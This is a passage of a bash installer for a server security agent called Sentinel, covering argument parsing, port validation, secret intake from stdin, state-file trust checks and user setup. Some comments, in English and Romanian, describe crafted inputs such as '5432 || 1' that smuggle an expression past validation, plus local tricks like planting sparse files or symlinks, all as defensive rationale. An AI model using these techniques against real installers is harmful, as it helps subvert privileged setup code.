#!/usr/bin/env bash
#
# Sentinel server-side installer. Idempotent, step-numbered, resumable.
#
# All the real deployment logic lives here rather than in the Windows-side
# scripts, so there is one implementation to test and `deploy.sh` and
# `deploy.ps1` stay thin and behaviourally identical.
#
#   ./install.sh --domain sentinel.example.com
#                [--nginx-mode dedicated|shared] [--web-port 8443]
#                [--cert-mode auto|webroot|dns|selfsigned|none]
#                [--admin-ip 203.0.113.10] [--db-port 5432]
#                [--from-step N] [--force-step N[,N…]]
#                [--skip-preflight]
#
#   --from-step N    skips every step BELOW N. At or above N a completion marker
#                    still wins, so this resumes an interrupted install; it does
#                    not re-run anything already done.
#   --force-step L   clears the markers of the listed steps so their bodies run
#                    again: one number, or a comma-separated list. The list form
#                    exists because some steps are one operation — rotating
#                    SENTINEL_DB_PASSWORD needs 22 (ALTER ROLE) and 27
#                    (secrets.env) in the SAME pass, since the services are
#                    restarted at the end of it. See docs/OPERARE.md §11.
#   --db-port N      pin PostgreSQL's own port instead of letting step 22 read
#                    whatever the cluster actually ended up on. 5432 is never
#                    assumed: on a host where something else already publishes
#                    it (a container, most often) the cluster manager — or, if
#                    it did not, this installer — moves to a free port on its
#                    own, and that is what sentinel.yaml gets. This flag is for
#                    an operator who wants a SPECIFIC port instead.
#
# Two ways to expose the dashboard, chosen with --nginx-mode:
#
#   dedicated (default)  Sentinel's own nginx listener on --web-port (8443).
#                        Touches nothing that already exists. The URL carries the
#                        port, and certbot's HTTP-01 challenge is unavailable
#                        because Sentinel does not own :80 — see --cert-mode.
#
#   shared               Sentinel becomes a vhost on the nginx already serving
#                        80/443, selected by server_name. Clean URL, working
#                        HTTP->HTTPS redirect, and certificates work normally
#                        because Sentinel serves its own ACME challenge. Requires
#                        nginx to be what owns those ports.
#
# Secrets arrive on stdin as KEY=value lines. They are never passed as
# arguments, never written to the repo, and never appear in the process list.
#
#   ./install.sh --domain … < secrets.env
#
# Ordering is deliberate in two places:
#   * The nftables allowlist is populated BEFORE any drop rule exists.
#   * Services start one at a time, each behind a health gate, so a failure
#     stops at one broken unit rather than six.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SRC_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
# shellcheck source=lib/common.sh
source "${SCRIPT_DIR}/lib/common.sh"
source "${SCRIPT_DIR}/lib/distro.sh"

# Everything below branches on this. Detecting once, early, means a failure
# here is a clear refusal rather than a confusing package error 200 lines in.
distro_detect || die "cannot read /etc/os-release — unsupported system"
distro_supported || die "unsupported distribution: ${DISTRO_PRETTY}. Sentinel installs on RHEL-family (AlmaLinux, Rocky, RHEL, Fedora) and Debian-family (Debian, Ubuntu) hosts."

DOMAIN=""
ADMIN_IP=""
ADMIN_EMAIL=""
FROM_STEP=""
FORCE_STEP=""
SKIP_PREFLIGHT=0
SURICATA_OK=0

# An explicit port for step 22 to pin PostgreSQL to, instead of reading
# whatever the cluster actually ended up on. Empty means "no override" — step
# 22 measures the live cluster rather than guessing 5432. See step_postgres.
DB_PORT_OVERRIDE=""

# The public HTTPS port for the dashboard. Not 443: this host serves something
# else there. See deploy/nginx/sentinel.conf.tmpl for the consequences.
PUBLIC_PORT="${PUBLIC_PORT:-8443}"

# How to obtain the TLS certificate. certbot's HTTP-01 challenge needs :80, which
# Sentinel does not own, so `--nginx` is not an option:
#   auto       test whether the existing :80 service can serve an ACME challenge;
#              use webroot if it can, self-signed if it cannot   (default)
#   webroot    assume it can, and use it
#   dns        DNS-01; needs a certbot DNS plugin configured
#   selfsigned skip issuance entirely
#   none       leave whatever certificate is already there
CERT_MODE="auto"

# How the dashboard is exposed:
#   dedicated  Sentinel's own nginx listener on --web-port (8443). Touches
#              nothing that exists, but the URL carries the port and certbot's
#              HTTP-01 challenge is unavailable.
#   shared     Sentinel becomes a vhost on the nginx already serving 80/443,
#              scoped by server_name. Clean URL, working redirect, and
#              certificates work normally because Sentinel serves its own ACME
#              challenge. Requires nginx to be what owns those ports, and writes
#              into a config directory shared with the operator's sites.
NGINX_MODE="dedicated"

# Whether nginx was on this host before we touched it. Decides whether editing
# nginx.conf is ours to do. Observed once, in step_packages, and then read from
# the write-once record — see nginx_preexisting_resolve.
NGINX_WAS_PREEXISTING=0
NGINX_PREEXISTING_FACT=nginx_preexisting

# The marker run_step writes for step 20. Pinned as a constant because
# nginx_preexisting_resolve reads it to tell a first install from a host that has
# already been through step 20, and a silent mismatch there would put the
# migration back where it started.
STEP_PACKAGES_KEY=20_packages
DEPLOY_TS="$(date -u +%Y%m%d-%H%M%S)"
SNAPSHOT_DIR="${SENTINEL_BACKUP_DIR}/predeploy-${DEPLOY_TS}"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --domain)         DOMAIN="${2:-}"; shift 2 ;;
        --admin-ip)       ADMIN_IP="${2:-}"; shift 2 ;;
        --email)          ADMIN_EMAIL="${2:-}"; shift 2 ;;
        --web-port)       PUBLIC_PORT="${2:-}"; shift 2 ;;
        --db-port)        DB_PORT_OVERRIDE="${2:-}"; shift 2 ;;
        --nginx-mode)     NGINX_MODE="${2:-}"; shift 2 ;;
        --cert-mode)      CERT_MODE="${2:-}"; shift 2 ;;
        --from-step)      FROM_STEP="${2:-}"; shift 2 ;;
        --force-step)     FORCE_STEP="${2:-}"; shift 2 ;;
        --skip-preflight) SKIP_PREFLIGHT=1; shift ;;
        --allow-firewalld) export ALLOW_FIREWALLD=1; shift ;;
        --allow-ufw)      export ALLOW_UFW=1; shift ;;
        --yes|-y)         export SENTINEL_ASSUME_YES=1; shift ;;
        # The range covers the header block down to the end of the nginx-mode
        # description. It is a line count, so it moves when the header does —
        # tests/unit/test_force_step_list.py pins that --help still shows the
        # flags it documents.
        --help|-h)        sed -n '2,44p' "$0"; exit 0 ;;
        *) die "unknown argument: $1" ;;
    esac
done

# Step selection is resolved here, before anything is touched.
#
# Both refusals below happen at startup on purpose. An installer that starts,
# forces half of what it was asked, and then discovers the rest was nonsense
# leaves the host in a state nobody asked for — for a password rotation, that
# state is "database changed, services still holding the old value".
assert_force_steps_above_from_step() {
    [[ -n "$FROM_STEP" ]] || return 0
    local forced
    for forced in ${FORCE_STEPS[@]+"${FORCE_STEPS[@]}"}; do
        # --from-step is applied first in run_step, so a forced step below it is
        # skipped rather than forced. Refuse the combination instead of quietly
        # obeying one half of it.
        if (( forced < FROM_STEP )); then
            die "--force-step ${forced} is below --from-step ${FROM_STEP}, so it would be \
skipped rather than re-run. Drop one of the two flags."
        fi
    done
}

if [[ -n "$FROM_STEP" && ! "$FROM_STEP" =~ ^[0-9]+$ ]]; then
    die "--from-step: '${FROM_STEP}' is not a step number"
fi
# 1024, not 1: PostgreSQL's own unit runs as the unprivileged `postgres`
# user (see step_postgres's loopback-only pg_hba rules below), and binding
# anything under 1024 needs CAP_NET_BIND_SERVICE or root — neither of which
# that unit has. A port down there would never bind no matter how many
# times step 22 retries, and the failure would only surface after
# postgresql.conf had already been rewritten to it. Refusing it here, before
# anything is touched, is cheaper than the restore-and-recover path
# pg_ensure_listening has to run for every OTHER way this can fail.
#
# The regex requires the FIRST digit to be 1-9 and bounds the total length
# to 4-5 digits — two separate traps, not one. A leading zero (`05432`)
# would pass a plain [0-9]+ digit class and the range check both, but
# step_postgres writes it into postgresql.conf verbatim and pg_wait_listening
# hands it to `ss` verbatim too — both compare it as a STRING, and "05432"
# never equals what a real cluster or a real socket reports as "5432". A
# perfectly usable port would take the restore-and-recover path for nothing.
# Separately, an unbounded digit string overflows bash's 64-bit `(( ))`
# silently and can wrap back inside 1..65535 (measured: the 20-digit
# 18446744073709557048 evaluates as 5432 under `(( ))` — "in range", not the
# refusal its length deserves). Either bug would wave through a value nobody
# could ever have meant.
# Two more traps, found on the production host, in the two things above:
# ASCII digits only, and acceptance as the narrow path instead of rejection.
#
# Measured on that host (bash 5.1.8 / glibc 2.34, LANG=en_US.UTF-8 — what
# `sudo -n install.sh` actually runs under there): `[0-9]` inside `[[ =~ ]]`
# is a regex BRACKET EXPRESSION, and glibc's regex engine treats it as a
# locale COLLATING CLASS under a UTF-8 locale, not a literal byte range — it
# matches fullwidth digits (U+FF10-FF19) and Arabic-Indic digits (U+0660-
# 0669) too, because those collate as "digit" there. `[[:digit:]]` was
# measured NOT to have this hole on that one glibc/locale combination, but it
# is defined by the exact same locale tables — "didn't match today, here" is
# a measurement of one host, not a guarantee for a different distro, a
# different glibc, or this same host after a locale-data update, and this
# file has already shipped one --db-port gate that was correct for every
# input someone thought to try. LC_ALL=C is not a measurement: POSIX
# requires the C locale to define bracket expressions and classes as literal
# ASCII, unconditionally. It is scoped to a subshell — not `export` — so
# nothing past this line runs under a changed locale.
#
# The accept path is also now the narrow one. This is the second guard, and
# its scope is exact: it catches the collating-class hole — any glyph that a
# locale collates as a digit still makes `10#` ERROR — but NOT arbitrary
# text. With the character check widened to `.+`, "5432 || 1" is ACCEPTED,
# because arithmetic precedence makes `10#5432 || 1` true. Measured on the
# host and locally. So the load-bearing guard is LC_ALL=C above; the chain
# below is the net for exactly the class LC_ALL=C is meant to exclude. The old shape was `[[ bad ]] || (( out_of_range )); then die` — and
# a fullwidth digit that survives the character check does not make
# `(( 10#$v ... ))` cleanly false, it makes bash ERROR ("invalid integer
# constant"). That error still returns exit status 1, IDENTICAL to a clean
# false, so `||` cannot tell them apart and reads "not out of range" — the
# value is waved through. Measured on the host: rc=0, ACCEPTED, continued.
# Below, acceptance requires the WHOLE `&&` chain to succeed on purpose: a
# regex match AND a clean in-range comparison. A value that makes the
# arithmetic error out is now indistinguishable from one that is cleanly out
# of range — both land in the `else`, which is `die` — instead of both
# looking like success.
_db_port_is_usable() {
    local v="$1"
    ( LC_ALL=C
      [[ "$v" =~ ^[1-9][0-9]{3,4}$ ]] && (( 10#$v >= 1024 && 10#$v <= 65535 )) )
}
if [[ -n "$DB_PORT_OVERRIDE" ]]; then
    if ! _db_port_is_usable "$DB_PORT_OVERRIDE"; then
        die "--db-port: '${DB_PORT_OVERRIDE}' is not a usable PostgreSQL port — needs to be \
1024-65535, ASCII digits only, no leading zero (below 1024 needs root; PostgreSQL's own unit \
does not run as root)"
    fi
fi
parse_force_steps "$FORCE_STEP"
assert_force_steps_exist "${BASH_SOURCE[0]}"
assert_force_steps_above_from_step

need_root

# Secrets from stdin, before anything else can consume it.
#
# When stdin is a pipe it belongs entirely to the secrets, which means there is
# no terminal left to prompt on. That is the normal path: deploy.sh has already
# shown the lockout warning and taken the operator's confirmation locally, so
# prompting again here would only deadlock on EOF.
declare -A SECRETS=()
SECRETS_BAD_LINES=()
SECRETS_CRLF_LINES=0

# A line that is not NAME=value is not a secret, and it is not a name either.
#
# This was `while IFS='=' read -r key value`, which puts a line with no `=`
# entirely into `key`. So the second line of a value an editor had wrapped
# became a "key name" made of secret material — and the installer then printed
# that name, verbatim, when it declined to write it. The tail of an API key
# ended up on the operator's console and in the deploy log.
#
# The rule is the same one the on-disk path already follows: what does not look
# like an environment variable name is reported by LINE NUMBER, never by
# content, because on a malformed line the content is the secret.
#
# Leading whitespace is tolerated on comments and on keys, because
# sentinel/config.py:load_secrets strips before parsing. A key the product would
# read and the installer would call garbage is a key the installer would delete.
read_stdin_secrets() {
    local line stripped lineno=0 key value
    while IFS= read -r line || [[ -n "$line" ]]; do
        lineno=$((lineno + 1))

        # A CR from a secrets/.env.local edited on Windows. It has to come off
        # HERE, before anything reads the value, and the reason is not tidiness:
        #
        #   value arrives as `"secret"<CR>` → the trailing-quote strip below no
        #   longer matches, so the value becomes `secret"<CR>`. That exact string
        #   is what step 22 hands to `ALTER ROLE ... PASSWORD` and what step 27
        #   writes to secrets.env — but sentinel/config.py strips the line when
        #   the daemons read it, so they authenticate with `secret"` against a
        #   database expecting `secret"<CR>`. Every daemon fails to connect after
        #   a rotation that reported success.
        #
        # Only the stdin path is normalised. A CR already inside secrets.env on
        # the host is left exactly as it is: the database was given that value
        # too, and quietly rewriting it here would break the match rather than
        # repair it.
        if [[ "$line" == *$'\r' ]]; then
            SECRETS_CRLF_LINES=$((SECRETS_CRLF_LINES + 1))
            line="${line%$'\r'}"
        fi

        stripped="${line#"${line%%[![:space:]]*}"}"
        [[ -z "$stripped" || "$stripped" == \#* ]] && continue

        if [[ ! "$stripped" =~ ^([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
            SECRETS_BAD_LINES+=("$lineno")
            continue
        fi
        key="${BASH_REMATCH[1]}"; value="${BASH_REMATCH[2]}"
        value="${value%\"}"; value="${value#\"}"
        SECRETS["$key"]="$value"
    done
}

if [[ ! -t 0 ]]; then
    read_stdin_secrets
    if (( SECRETS_CRLF_LINES )); then
        warn "${SECRETS_CRLF_LINES} line(s) arrived with CRLF endings. They were \
handled, and nothing here is wrong now — but secrets/.env.local was saved by an \
editor that writes Windows line endings, and that file is not covered by \
.gitattributes. Convert it to LF before the next edit."
    fi
    if (( ${#SECRETS_BAD_LINES[@]} )); then
        warn "${#SECRETS_BAD_LINES[@]} line(s) on stdin were neither a comment nor \
KEY=value and were ignored — line(s): ${SECRETS_BAD_LINES[*]}"
        warn "The content is deliberately not shown: on a wrapped line it is the \
secret itself. The usual cause is a value broken across two lines in \
secrets/.env.local — if so, the key ABOVE it arrived truncated."
    fi
    export SENTINEL_ASSUME_YES=1
fi

# ===========================================================================
step_preflight() {
    if (( SKIP_PREFLIGHT )); then
        warn "preflight skipped by request — you are deploying blind"
        return 0
    fi
    "${SCRIPT_DIR}/preflight.sh" ${DOMAIN:+--domain "$DOMAIN"} --web-port "$PUBLIC_PORT" \
        --nginx-mode "$NGINX_MODE" \
        || die "preflight failed. Nothing has been changed."
}

#
# Resolve the derived, in-process configuration that later steps depend on:
# ADMIN_IP, PUBLIC_PORT, SURICATA_OK, BPF_HINT, NGINX_WAS_PREEXISTING, and the
# validated nginx mode. It reads preflight.env (written by step 1) and applies
# command-line overrides.
#
# This is NOT a run_step: it must execute on EVERY invocation, never behind a
# completion marker. Variables live only for the current process, but markers
# persist on disk — so a marker-gated version would be skipped on any resume,
# and every downstream step would then run with this state UNSET. That is exactly
# how a shared-mode resume regenerated sentinel.yaml with the dedicated default
# port (8443) and failed validation: the PUBLIC_PORT=443 resolution lived in a
# step that the resume skipped.
# Was nginx on this host before Sentinel touched it? One answer, from the record.
#
# The observation is only valid the first time it is made — step 20, before the
# package install. Every run after that reads what was written down. Four
# sources, in this order, and the order is the design (most specific record
# first):
#
#   1. the write-once fact, at its CURRENT (2026-09-08 onward) location under
#      $STATE_MARKERS. Once written there, nothing changes it.
#   2. the SAME fact, still sitting at the location it was written to before
#      2026-09-08 (${_LEGACY_STATE_MARKERS}/facts/…) — a host that already ran
#      the fact-writing code but has not redeployed since the marker directory
#      moved. Read directly and promoted into (1), never migrated: nothing
#      renames or chmods this path, this is a bounded `head -c` of one file
#      whose only valid contents are "0" or "1".
#   3. the legacy NGINX_WAS_PREEXISTING= line in preflight.env, older still —
#      a host installed before the fact file existed at all has its only
#      record there. Read from the SAME legacy location as (2), for the same
#      reason: nothing copies that file to the new, root-only directory any
#      more (see the comment on SENTINEL_INSTALL_STATE_DIR in
#      deploy/lib/common.sh — three rounds tried to make that copy safe and
#      each was beaten by a different bypass of the same shape). Defaulting
#      to 0 instead of reading this line, on a host whose only record of the
#      answer IS this line, would hand step 33 permission to edit an
#      operator's own nginx.conf — that is the failure this tier exists to
#      prevent. Measured 2026-09-28, and NOT what an earlier draft of this
#      comment claimed: /var/lib/sentinel-install does not exist on either
#      live host, so tier (1) is EMPTY on both and THIS tier is the live path
#      on the next deploy of each -- not a dormant compatibility branch. Both
#      legacy facts read 0; neither preflight.env still has an
#      NGINX_WAS_PREEXISTING line, so neither reaches tier (3).
#
#      A separate fact the operator must decide on, recorded here because
#      this tier is what carries it forward: production's recorded 0 is
#      WRONG. nginx was there first -- Sentinel's own first install logged
#      "Package nginx-2:1.20.1-22 is already installed" on 2026-07-30, the
#      rpm went in 2026-03-11, and one of the operator's own vhosts under
#      /etc/nginx/conf.d/ dates from the same day. The 0 was written
#      2026-08-28 by tier (4)'s
#      silence rule, after preflight.env had already been rewritten. Harmless
#      while production runs --nginx-mode shared, because step_nginx_shared
#      never reads this flag; a future dedicated run would comment out
#      `listen 80` in the operator's own nginx.conf, where that vhost lives.
#   4. no record anywhere, on a host that has ALREADY run step 20. The silence
#      is itself the record: the old code appended that line only when it
#      FOUND nginx, so its absence after step 20 means nginx was not here.
#      Written down rather than re-derived every run, because otherwise the
#      next --force-step 20 would observe our own nginx and record 1 — the
#      same bug, back through the gap.
#
# (2) and (3) read from ${_LEGACY_STATE_MARKERS}, a directory `sentinel` can
# write to — but neither ever executes what it finds there, only extracts one
# value already constrained to "0" or "1" by a regex before it is trusted for
# anything. The worst a forged value achieves is Sentinel treating its own
# nginx as the operator's (over-cautious) or the operator's nginx as its own
# (the direction that matters) — bounded to that one reviewed decision, never
# arbitrary code, which is what made trusting preflight.env's CONTENTS wholesale
# (via `source`) the actual vulnerability this file's other defences close.
#
# Read from the FILE, not from the variable preflight.env sets: install.sh
# initialises NGINX_WAS_PREEXISTING=0 at the top, so a variable test cannot tell
# "preflight said 0" from "preflight said nothing" — and on a first install it
# would freeze that 0 before step 20 has looked at the host at all.
nginx_preexisting_resolve() {
    local env_file="${1:-}" legacy=""

    if fact_recorded "$NGINX_PREEXISTING_FACT"; then
        fact_read "$NGINX_PREEXISTING_FACT"
        return 0
    fi

    # (2) — the fact, at the pre-2026-09-08 location. Never `source`d, never
    # moved: a few bytes read out of one file, kept only if what they hold is
    # exactly "0" or "1".
    #
    # `head -c`, not `head -1`: this directory is `sentinel`-writable, so
    # `sentinel` can rename `.install-state` aside and plant a newline-less
    # file here — a `truncate -s 16T` sparse file costs no disk blocks, and
    # ext4 allows it. `head -1` scans for a newline byte that never arrives,
    # so it would read to EOF (measured: 7.65s on a 3 GB sparse file, and
    # nothing bounds how large the planted file claims to be) and the root
    # installer would sit here on every deploy. `head -c` stops after a fixed
    # number of bytes regardless of what lies beyond them — no real "0" or
    # "1" answer is anywhere near that size, so nothing legitimate is cut
    # short by it.
    #
    # `-L` refuses a symlink at this exact path: `-f` alone follows the link
    # and would accept one pointed at any regular file `sentinel` can name —
    # narrow (the value is still constrained to "0"/"1" below), but there is
    # no reason to read through a link `sentinel` planted when reading the
    # file it names directly costs nothing extra.
    local legacy_fact="${_LEGACY_STATE_MARKERS}/facts/${NGINX_PREEXISTING_FACT}"
    if [[ -f "$legacy_fact" && ! -L "$legacy_fact" ]]; then
        local legacy_fact_value
        legacy_fact_value="$(head -c 64 "$legacy_fact" 2>/dev/null | tr -d '[:space:]')"
        [[ "$legacy_fact_value" =~ ^[01]$ ]] && legacy="$legacy_fact_value"
    fi

    # (3) — grep and parameter expansion rather than a sed script: this line
    # has been edited by hand more than once, and an escaping mistake here
    # reads as "no legacy record" — which on production would mean "nginx is
    # ours to edit".
    if [[ -z "$legacy" && -f "$env_file" ]]; then
        legacy="$(grep -E '^NGINX_WAS_PREEXISTING=[01][[:space:]]*$' "$env_file" | tail -1)"
        legacy="${legacy#NGINX_WAS_PREEXISTING=}"
        legacy="${legacy//[[:space:]]/}"
    fi
    if [[ -n "$legacy" ]]; then
        fact_record_once "$NGINX_PREEXISTING_FACT" "$legacy"
        return 0
    fi

    if step_done "$STEP_PACKAGES_KEY"; then
        fact_record_once "$NGINX_PREEXISTING_FACT" 0
        return 0
    fi

    # Nothing recorded, and step 20 has not run: this is a first install and the
    # real answer arrives in a few seconds. Deliberately NOT written down — that
    # would be the record answering a question nobody has asked the host yet.
    printf '0\n'
}

resolve_config() {
    # Command-line values, captured before `source` can clobber them: an explicit
    # flag must always beat whatever preflight persisted.
    local cli_admin_ip="$ADMIN_IP" cli_domain="$DOMAIN" cli_public_port="$PUBLIC_PORT"

    local env_file="${STATE_MARKERS}/preflight.env"
    if [[ -f "$env_file" ]]; then
        # This is sourced as root, unconditionally, on EVERY run. $STATE_MARKERS
        # being 0700 root:root, with its parent (/var/lib) also root-owned,
        # stops `sentinel` from ever placing a file at this path — this check
        # exists anyway for what a build older than this fix left behind, or
        # for a $STATE_MARKERS somehow left looser than 0700. "Unknown" is not
        # "clean": a stat that fails is refused exactly like one that succeeds
        # and says the wrong owner.
        assert_root_owned_state_file "$env_file" || die "refusing to source \
${env_file}: it or its directory is not root-owned/0700. This file is executed \
as root on every install run; treat this as tampering to investigate, not as a \
permissions slip to silence. See deploy/lib/common.sh's assert_root_owned_state_file."
        # shellcheck disable=SC1090
        source "$env_file"
    fi

    # Safe defaults for anything preflight did not provide (e.g. --skip-preflight),
    # so `set -u` cannot trip on a first-use below.
    SURICATA_OK="${SURICATA_OK:-0}"
    MEM_AVAIL="${MEM_AVAIL:-0}"
    BPF_HINT="${BPF_HINT:-}"
    # The LEGACY path, not $env_file: nothing moves the pre-2026-09-08
    # preflight.env into $STATE_MARKERS any more (see nginx_preexisting_resolve's
    # own comment, and the one on SENTINEL_INSTALL_STATE_DIR in
    # deploy/lib/common.sh), so a host installed before the fact file existed
    # has its only record of this at the OLD location or nowhere. Passing that
    # path here does not need a trust decision the way `source`ing it would:
    # nginx_preexisting_resolve only ever `grep`s a `KEY=[01]` line out of it,
    # never executes it, so the worst a hostile ${SENTINEL_USER} can do by
    # planting one is make Sentinel wrongly cautious (treat its own nginx as
    # the operator's) or, the direction that actually matters, wrongly
    # confident (treat the operator's nginx as ours to edit) — bounded to that
    # one already-reviewed value, not arbitrary code.
    NGINX_WAS_PREEXISTING="$(nginx_preexisting_resolve "${_LEGACY_STATE_MARKERS}/preflight.env")"

    [[ -n "$cli_admin_ip" ]]    && ADMIN_IP="$cli_admin_ip"
    [[ -n "$cli_domain" ]]      && DOMAIN="$cli_domain"
    [[ -n "$cli_public_port" ]] && PUBLIC_PORT="$cli_public_port"
    [[ -z "$ADMIN_IP" ]] && ADMIN_IP="$(ssh_peer_ip)"
    [[ -z "$ADMIN_IP" ]] && ADMIN_IP="${SENTINEL_ADMIN_IP:-}"

    if [[ -z "$ADMIN_IP" ]]; then
        warn "no admin IP determined. Nothing will be allowlisted, so an auto-block \
could in principle reach you. Auto-block ships disabled, so this is not immediately \
dangerous — but set it before enabling auto-block."
    else
        ok "admin IP for the allowlist: ${ADMIN_IP}"
    fi
    info "Suricata: $( (( SURICATA_OK )) && echo enabled || echo 'disabled (log-only mode)' )"

    case "$NGINX_MODE" in
        dedicated)
            if [[ "$PUBLIC_PORT" =~ ^(80|443|22)$ ]]; then
                die "--web-port ${PUBLIC_PORT} cannot be bound. 22 would end your SSH session; binding 80 or 443 would displace whatever this host is actually for. If you want the dashboard on 443, use --nginx-mode shared, which adds a vhost to the existing nginx instead of binding the port."
            fi
            info "dedicated mode: nginx will listen on :${PUBLIC_PORT} — 80 and 443 stay untouched"
            ;;
        shared)
            # Nothing new is bound in shared mode — the existing nginx is already
            # listening on 443. The port only appears in URLs, never on a socket.
            [[ -n "$DOMAIN" ]] || die "--nginx-mode shared requires --domain: the vhost is selected by server_name, and without one it would have to claim default_server, which would hijack how your other sites answer an unknown Host."
            PUBLIC_PORT=443
            info "shared mode: dashboard at https://${DOMAIN} (no port suffix)"
            ;;
        *)
            die "--nginx-mode must be 'dedicated' or 'shared', got: ${NGINX_MODE}"
            ;;
    esac

    export SENTINEL_PUBLIC_PORT="$PUBLIC_PORT"

    # Stabilise the snapshot directory ONLY when step 18 will not run this
    # session. SNAPSHOT_DIR is seeded from a per-run timestamp, so a run that
    # skips step 18 would point at a directory nobody created — breaking the
    # nginx-config backup (step 33) and the automatic rollback (step 38), both of
    # which write to and read from it. There, `predeploy-latest` is the truth.
    #
    # The condition used to be "the symlink exists", and that was wrong in a way
    # that only showed up weeks later. The symlink outlives the run that made it,
    # so every later deploy inherited the FIRST snapshot ever taken and then
    # printed it as its rollback target. Measured on 21 August 2026: a deploy
    # advertised a snapshot whose files were all dated 31 July. A rollback would
    # have restored three weeks of unrelated state — nftables, nginx, the package
    # list — to undo one change. The step is in ALWAYS_STEPS now, so the only
    # remaining way for it not to run is --from-step above it, and that is
    # exactly what this tests for.
    if [[ -n "${FROM_STEP:-}" ]] && (( FROM_STEP > 18 )); then
        local latest="${SENTINEL_BACKUP_DIR}/predeploy-latest"
        if [[ -L "$latest" ]]; then
            local resolved; resolved="$(readlink -f "$latest" 2>/dev/null || true)"
            [[ -n "$resolved" && -d "$resolved" ]] && SNAPSHOT_DIR="$resolved"
        fi
    fi
}

# --- 18 -------------------------------------------------------------------
step_snapshot() {
    mkdir -p "$SENTINEL_BACKUP_DIR"
    chmod 0700 "$SENTINEL_BACKUP_DIR"
    snapshot_create "$SNAPSHOT_DIR"
    ln -sfn "$SNAPSHOT_DIR" "${SENTINEL_BACKUP_DIR}/predeploy-latest"

    # Preflight normally captures this. Capture it here too, so that a run with
    # --skip-preflight still has something to compare against at step 38 — an
    # install with no baseline cannot tell whether it broke anything.
    [[ -f "${STATE_MARKERS}/baseline-services.txt" ]] || capture_baseline
}

# --- 19 -------------------------------------------------------------------
step_user_and_dirs() {
    if ! getent group "$SENTINEL_USER" >/dev/null; then
        groupadd --system "$SENTINEL_USER"
        ok "group ${SENTINEL_USER} created"
    fi
    if ! getent passwd "$SENTINEL_USER" >/dev/null; then
        useradd --system --gid "$SENTINEL_USER" \
                --home-dir "$SENTINEL_PREFIX" --no-create-home \
                --shell /sbin/nologin \
                --comment "Sentinel security agent" "$SENTINEL_USER"
        ok "user ${SENTINEL_USER} created (no login shell)"
    fi

    install -d -m 0755 -o root -g root                          "$SENTINEL_PREFIX"
    install -d -m 0755 -o root -g root                          "${SENTINEL_PREFIX}/bin"
    install -d -m 0755 -o root -g root                          "${SENTINEL_PREFIX}/libexec"
    install -d -m 0750 -o root -g "$SENTINEL_USER"              "$SENTINEL_CONFIG_DIR"
    install -d -m 0750 -o "$SENTINEL_USER" -g "$SENTINEL_USER"  "$SENTINEL_STATE_DIR"
    install -d -m 0750 -o "$SENTINEL_USER" -g "$SENTINEL_USER"  "${SENTINEL_STATE_DIR}/geoip"
    install -d -m 0750 -o "$SENTINEL_USER" -g "$SENTINEL_USER"  "${SENTINEL_STATE_DIR}/cursors"
    # The root executor owns this one. Its capability set deliberately omits
    # CAP_DAC_OVERRIDE, so root cannot write into the sentinel-owned state dir
    # above — its hash-chained audit log needs a directory it owns outright.
    install -d -m 0750 -o root -g root                          "${SENTINEL_STATE_DIR}/executor"
    install -d -m 0700 -o root -g root                          "$SENTINEL_BACKUP_DIR"
    install -d -m 0755 -o "$SENTINEL_USER" -g "$SENTINEL_USER"  "$SENTINEL_PREFIX/claude-workspace"

    ensure_tmpfiles_applied

    # Read-only access to logs the collectors tail. Group membership rather than
    # a sudo rule: the collectors never need to run anything privileged.
    for grp in systemd-journal adm; do
        getent group "$grp" >/dev/null && usermod -aG "$grp" "$SENTINEL_USER"
    done
    # The docker group is deliberately NOT granted here — see
    # `ensure_docker_access` below. This step is marker-gated, and docker can
    # appear on a host long after the day it was installed.
}

# Necondiționat, la fiecare rulare — NU un pas, exact ca `resolve_config` și
# `ensure_instance_id` mai jos. `deploy/tmpfiles/sentinel.conf` poartă conținut
# de repo, care se schimbă între versiuni — vezi linia directorului
# watchdog-ului, adăugată pe 7 septembrie 2026, mult după ce pasul 19 era demult
# marcat făcut pe gazda de producție. Fără reaplicare necondiționată, o gazdă
# existentă n-ar primi niciodată linia nouă, `sentinel-watchdog.service` ar găsi
# directorul lipsă la nesfârșit, iar flush-ul anti-lockout pentru un dashboard
# picat n-ar mai putea porni vreodată — exact bug-ul care a produs funcția asta.
#
# De ce nu în `ALWAYS_STEPS`: ar reface și restul pasului 19 (creare user/grup,
# `install -d` pe tot arborele /opt/sentinel) la fiecare deploy, nu doar partea
# care chiar are nevoie de asta. De ce nu un pas numerotat nou: ar muta numerele
# tuturor pașilor de după el, adică ar invalida fiecare `--force-step N` din
# documentație și din istoricul comenzilor operatorului — motivul exact scris
# la `ensure_instance_id`.
#
# Sigur de rulat oricând: `systemd-tmpfiles --create` pe o linie `d` ajustează
# proprietarul și modul unui director EXISTENT la valorile declarate — de asta
# se rulează la fiecare boot pentru /run — deci o gazdă unde directorul a fost
# creat greșit de o rulare veche se corectează, nu doar una unde lipsește.
ensure_tmpfiles_applied() {
    install -D -m 0644 "${SCRIPT_DIR}/tmpfiles/sentinel.conf" /usr/lib/tmpfiles.d/sentinel.conf
    systemd-tmpfiles --create /usr/lib/tmpfiles.d/sentinel.conf
}

# ---------------------------------------------------------------------------
# Accesul lui `sentinel` la socketul docker.
#
# NU e un pas numerotat, exact ca `resolve_config` și `ensure_instance_id`:
# se cheamă necondiționat din `main`, între 19 și 20. Trei motive, în ordinea
# importanței:
#
#   * pasul 26 (`configs`, ÎN ALWAYS_STEPS) scrie `scan.containers` din
#     măsurătoarea de aici. O sursă supusă marcajelor n-ar putea răspunde la
#     fiecare deploy întrebării pe care pasul 26 o pune la fiecare deploy;
#   * aici a stat până acum, în pasul 19, și 19 e marcat din ziua instalării.
#     Docker poate apărea pe gazdă ORICÂND după aceea, iar atunci apartenența
#     n-ar mai fi acordată niciodată, în tăcere;
#   * un pas NOU ar muta numerele tuturor pașilor de după el, adică ar invalida
#     fiecare `--force-step N` din docs/OPERARE.md, din DEPANARE.md și din
#     istoricul de comenzi al operatorului. Motivul e scris pe larg la
#     `ensure_instance_id`, care a fost mutată din același fel de loc.
#
# Ce se măsoară și ce ajunge în configurație:
#
#   fapt observat                                          stare      containers
#   ─────────────────────────────────────────────────────  ─────────  ──────────
#   niciun client, niciun socket, niciun DOCKER_HOST        absent        false
#   configurația VIE cere deja `scan.containers: false`     oprit         false
#   daemonul răspunde ca `sentinel` cu versiunea LUI        gata          true
